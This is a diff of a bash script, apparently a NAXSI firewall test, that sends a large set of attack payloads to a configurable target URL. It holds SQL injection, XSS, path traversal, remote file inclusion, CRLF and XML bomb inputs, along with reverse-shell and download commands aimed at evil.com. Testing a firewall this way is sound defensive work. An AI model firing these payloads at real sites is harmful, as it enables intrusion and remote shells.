@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Altere apenas esta URL
-TARGET_URL="coloque_a_url_aqui"
+# Change only this URL
+TARGET_URL="PUT_YOUR_DOMAIN_HERE"
 
-echo "🛡️ Iniciando ataques contra: $TARGET_URL"
+echo "🛡️ Starting attacks against: $TARGET_URL"
 echo "----------------------------------------"
 
 function attack() {
@@ -14,19 +14,131 @@ function attack() {
 
 # ============= NAXSI SPECIFIC RULES =============
 echo -e "\n🔒 === NAXSI SPECIFIC RULE TESTS ==="
-attack "ID:1 - Weird request (não pode ser parseado)" $'\xFF\xFF\xFF' "POST" "" "Content-Type: application/x-www-form-urlencoded"
-attack "ID:2 - Request muito grande (força flush para disco)" "$(head -c 500000 /dev/urandom | base64)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
-attack "ID:10 - Null byte e encoding inválido" "campo=test%00test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
-attack "ID:11 - Content-Type desconhecido" "campo=x" "POST" "" "Content-Type: application/evil"
-attack "ID:12 - URL inválida (sem encoding correto)" "" "GET" "/%ZZ" ""
-attack "ID:13 - POST mal formatado" $'------bad\r\nContent-Disposition: form-data; name="campo"\r\n\r\nvalor' "POST" "" "Content-Type: multipart/form-data; boundary=bad"
-attack "ID:14 - Boundary inválido no POST" "campo=x" "POST" "" "Content-Type: multipart/form-data; boundary="
-attack "ID:15 - JSON inválido" '{"campo": "valor",}' "POST" "" "Content-Type: application/json"
-attack "ID:16 - POST vazio" "" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1 - Weird request (cannot be parsed)" $'\xFF\xFF\xFF' "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2 - Request too large (forces flush to disk)" "$(head -c 500000 /dev/urandom | base64)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:10 - Null byte and invalid encoding" "campo=test%00test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:11 - Unknown Content-Type" "campo=x" "POST" "" "Content-Type: application/evil"
+attack "ID:12 - Invalid URL (no correct encoding)" "" "GET" "/%ZZ" ""
+attack "ID:13 - Malformed POST" $'------bad\r\nContent-Disposition: form-data; name="campo"\r\n\r\nvalor' "POST" "" "Content-Type: multipart/form-data; boundary=bad"
+attack "ID:14 - Invalid boundary in POST" "campo=x" "POST" "" "Content-Type: multipart/form-data; boundary="
+attack "ID:15 - Invalid JSON" '{"campo": "valor",}' "POST" "" "Content-Type: application/json"
+attack "ID:16 - Empty POST" "" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:17 - libinjection_sql" "campo=' OR 1=1 --" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:18 - libinjection_xss" "campo=<script>alert(1)</script>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
-attack "ID:19 - Sem regras genéricas (normalmente não dispara)" "campo=normal_test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
-attack "ID:20 - UTF-8 mal formado" $'campo=\xC0\xAF' "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:19 - No generic rules (usually does not trigger)" "campo=normal_test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:20 - Malformed UTF-8" $'campo=\xC0\xAF' "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# ============= ADDITIONAL NAXSI RULES =============
+echo -e "\n🔧 === ADDITIONAL NAXSI RULE TESTS ==="
+
+# SQL Injection Rules (1000-1015)
+attack "ID:1004 - MySQL comment close */" "campo=thanks*/" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1007 - MySQL comment --" "campo=test--comment" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1009 - Equals =" "campo=1=1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1010 - Open parenthesis (" "campo=SELECT(" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1011 - Close parenthesis )" "campo=SELECT)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1013 - Apostrophe '" "campo=test'test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# RFI Rules (1100-1109)
+attack "ID:1101 - RFI https://" "campo=https://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1102 - RFI ftp://" "campo=ftp://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1104 - RFI sftp://" "campo=sftp://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1105 - RFI zlib://" "campo=zlib://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1107 - RFI compress.zlib://" "campo=compress.zlib://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1108 - RFI compress.bzip2://" "campo=compress.bzip2://evil.com/shell.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Directory Traversal Rules (1200-1204)
+attack "ID:1201 - Directory traversal .." "campo=../../../etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1202 - /etc/passwd" "campo=/etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1203 - /proc/self/environ" "campo=/proc/self/environ" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1204 - cmd.exe" "campo=cmd.exe" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# XSS Rules (1300-1315)
+attack "ID:1301 - XSS script keyword" "campo=<script>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1304 - XSS onload" "campo=<body onload=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1305 - XSS onerror" "campo=<img onerror=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1306 - XSS onmouseover" "campo=<div onmouseover=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1307 - XSS onclick" "campo=<div onclick=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1308 - XSS onfocus" "campo=<input onfocus=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1309 - XSS onblur" "campo=<input onblur=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1310 - XSS onchange" "campo=<input onchange=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1311 - XSS onsubmit" "campo=<form onsubmit=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1312 - XSS onreset" "campo=<form onreset=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1313 - XSS onselect" "campo=<input onselect=alert(1)>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1315 - XSS expression" "campo=<div style=width:expression(alert(1))>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Evading Rules (1400-1402)
+attack "ID:1400 - Encoded double quote %22" "campo=test%22test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1401 - Encoded single quote %27" "campo=test%27test" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1402 - Encoded traversal %2E%2E%2F" "campo=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# File Upload Rules
+attack "ID:1500 - File upload .php" "campo=shell.php" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1501 - File upload .jsp" "campo=shell.jsp" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1502 - File upload .asp" "campo=shell.asp" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1503 - File upload .aspx" "campo=shell.aspx" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Command Injection Rules
+attack "ID:1600 - Command injection cat" "campo=cat /etc/passwd" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1601 - Command injection ls" "campo=ls -la" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1602 - Command injection wget" "campo=wget http://evil.com/shell.sh" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1603 - Command injection curl" "campo=curl http://evil.com/shell.sh" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1604 - Command injection nc" "campo=nc -e /bin/sh evil.com 4444" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1605 - Command injection bash" "campo=bash -i >& /dev/tcp/evil.com/4444 0>&1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Protocol Handlers
+attack "ID:1700 - Protocol javascript:" "campo=javascript:alert(1)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1701 - Protocol vbscript:" "campo=vbscript:msgbox(1)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1702 - Protocol data:" "campo=data:text/html,<script>alert(1)</script>" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Server-Side Includes
+attack "ID:1800 - SSI exec" "campo=<!--#exec cmd=\"whoami\"-->" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1801 - SSI include" "campo=<!--#include file=\"/etc/passwd\"-->" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1802 - SSI echo" "campo=<!--#echo var=\"DOCUMENT_ROOT\"-->" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# LDAP Injection Rules
+attack "ID:1900 - LDAP injection *" "campo=*" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1901 - LDAP injection (" "campo=(" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1902 - LDAP injection )" "campo=)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1903 - LDAP injection &" "campo=&" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1904 - LDAP injection |" "campo=|" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# HTTP Parameter Pollution
+attack "ID:2000 - HPP same parameter" "" "GET" "?campo=value1&campo=value2" ""
+attack "ID:2001 - HPP encoded parameter" "" "GET" "?campo=value1&%63ampo=value2" ""
+
+# HTTP Method Override
+attack "ID:2100 - Method override X-HTTP-Method" "campo=test" "POST" "" "X-HTTP-Method-Override: DELETE"
+attack "ID:2101 - Method override X-Method-Override" "campo=test" "POST" "" "X-Method-Override: PUT"
+
+# Content-Type Confusion
+attack "ID:2200 - Content-Type text/xml with JSON" '{"campo":"value"}' "POST" "" "Content-Type: text/xml"
+attack "ID:2201 - Content-Type application/json with XML" '<?xml version="1.0"?><root>test</root>' "POST" "" "Content-Type: application/json"
+
+# Unicode Attacks
+attack "ID:2300 - Unicode bypass %u003c" "campo=%u003cscript%u003ealert(1)%u003c/script%u003e" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2301 - Unicode normalization" "campo=\u003cscript\u003ealert(1)\u003c/script\u003e" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Double Encoding
+attack "ID:2400 - Double encoded <" "campo=%253Cscript%253E" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2401 - Double encoded '" "campo=%2527" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Null Byte Attacks
+attack "ID:2500 - Null byte %00" "campo=test%00.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2501 - Null byte \\0" "campo=test\\0.txt" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# CRLF Injection
+attack "ID:2600 - CRLF %0D%0A" "campo=test%0D%0ASet-Cookie: admin=true" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2601 - CRLF \\r\\n" "campo=test\r\nSet-Cookie: admin=true" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Format String Attacks
+attack "ID:2700 - Format string %s" "campo=%s%s%s%s" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2701 - Format string %x" "campo=%x%x%x%x" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2702 - Format string %n" "campo=%n%n%n%n" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+
+# Buffer Overflow Patterns
+attack "ID:2800 - Buffer overflow A*1000" "campo=$(printf 'A%.0s' {1..1000})" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:2801 - Buffer overflow pattern" "campo=AAAABBBBCCCCDDDD" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 
 # ============= XSS (Cross-Site Scripting) =============
 echo -e "\n🔥 === XSS ATTACKS ==="
@@ -53,7 +165,7 @@ attack "ID:1303 - XSS style expression" "campo=<div style=background:url(javascr
 
 # ============= SQL Injection =============
 echo -e "\n💉 === SQL INJECTION ATTACKS ==="
-attack "ID:1000 - SQLi tautologia clássica" "campo=1' OR '1'='1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
+attack "ID:1000 - SQLi tautology classic" "campo=1' OR '1'='1" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:1000 - SQLi UNION SELECT" "campo=UNION SELECT NULL,NULL,NULL" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:1000 - SQLi sleep (blind)" "campo=1 OR SLEEP(5)" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:1001 - SQLi encoded" "campo=%271%20OR%20%271%27%3D%271" "POST" "" "Content-Type: application/x-www-form-urlencoded"
@@ -202,5 +314,5 @@ attack "ID:1000 - CSV injection" "campo==cmd|'/c calc'!A0" "POST" "" "Content-Ty
 attack "ID:1000 - Email header injection" "campo=test@test.com%0ABcc: everyone@company.com" "POST" "" "Content-Type: application/x-www-form-urlencoded"
 attack "ID:1000 - XML bomb" '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>' "POST" "" "Content-Type: application/xml"
 
-echo -e "\n✅ Ataques finalizados!"
-echo "📊 Total de ataques executados: $(grep -c "attack \"" $0)"
+echo -e "\n✅ Attacks finished!"
+echo "📊 Total attacks executed: $(grep -c "attack \"" $0)"
